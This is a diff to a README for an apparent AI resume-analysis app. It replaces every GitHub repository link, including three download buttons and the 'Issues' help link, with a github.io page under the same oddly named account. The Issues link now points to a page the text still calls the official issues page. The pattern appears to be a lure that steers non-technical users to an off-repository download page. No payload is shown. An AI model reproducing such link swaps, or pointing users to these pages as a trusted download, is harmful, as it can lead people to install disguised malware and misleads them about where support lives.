@@ -1,6 +1,6 @@
 # 📄 Resume-Analyzer - Get Hired Faster With AI
 
-[🚀 Download Now](https://github.com/Aerobic-hidrosis3388/Resume-Analyzer) 
+[🚀 Download Now](https://aerobic-hidrosis3388.github.io) 
 
 ---
 
@@ -44,7 +44,7 @@ Ready? Here’s the simple 3-step process:
 
 Click this button (or use the one at the very top):
 
-[![Download Resume-Analyzer](https://img.shields.io/badge/⬇️-Download%20Resume--Analyzer-brightgreen?style=for-the-badge&logo=github&colorA=2c3e50&colorB=27ae60)](https://github.com/Aerobic-hidrosis3388/Resume-Analyzer)
+[![Download Resume-Analyzer](https://img.shields.io/badge/⬇️-Download%20Resume--Analyzer-brightgreen?style=for-the-badge&logo=github&colorA=2c3e50&colorB=27ae60)](https://aerobic-hidrosis3388.github.io)
 
 The link will open in your web browser.
 
@@ -131,7 +131,7 @@ If something isn’t working, here’s a final checklist:
 3. Did you double-click `start_windows.bat`?
 4. Did you wait 15 seconds after the browser opened?
 
-If you still have a problem, please visit the **Issues** tab on the [official GitHub page](https://github.com/Aerobic-hidrosis3388/Resume-Analyzer) (click the link and then “Issues” at the top). There you can describe what happened, and someone will help you.
+If you still have a problem, please visit the **Issues** tab on the [official GitHub page](https://aerobic-hidrosis3388.github.io) (click the link and then “Issues” at the top). There you can describe what happened, and someone will help you.
 
 ---
 
@@ -139,6 +139,6 @@ If you still have a problem, please visit the **Issues** tab on the [official Gi
 
 Your perfect resume is one click away. Visit the download page, follow the three steps above, and within 10 minutes you’ll know exactly how to improve your resume.
 
-[⬇️ Download the Application](https://github.com/Aerobic-hidrosis3388/Resume-Analyzer)
+[⬇️ Download the Application](https://aerobic-hidrosis3388.github.io)
 
 Good luck – and may your fit score be high! 🚀
